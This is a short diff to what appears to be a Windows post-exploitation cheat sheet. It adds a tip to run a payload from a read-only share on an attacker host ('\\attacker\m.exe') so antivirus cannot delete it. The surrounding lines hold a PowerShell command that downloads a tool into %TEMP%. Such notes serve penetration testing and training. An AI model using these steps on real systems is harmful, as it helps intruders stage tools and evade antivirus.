@@ -86,6 +86,7 @@ Get details about a group (i.e. administrators)
     net localgroup administrators
 
 
+
 ## Network Enumuration
 You will want to know how this host is connected; what kind of protocls and services are running, and finally maybe even tap into one of the interfaces and learn what's going on
 
@@ -197,6 +198,10 @@ Once you have the binary and dependency dll on you can run:
 
 
 ## Uploading / Downloading files 
+use read-only network shares (this also makes it impossible for the AV to delete the file):
+
+    \\attacker\m.exe
+
 a wget using powershell
 
     powershell -Noninteractive -NoProfile -command "wget https://addaxsoft.com/download/wpecs/wget.exe -UseBasicParsing -OutFile %TEMP%\wget.exe"
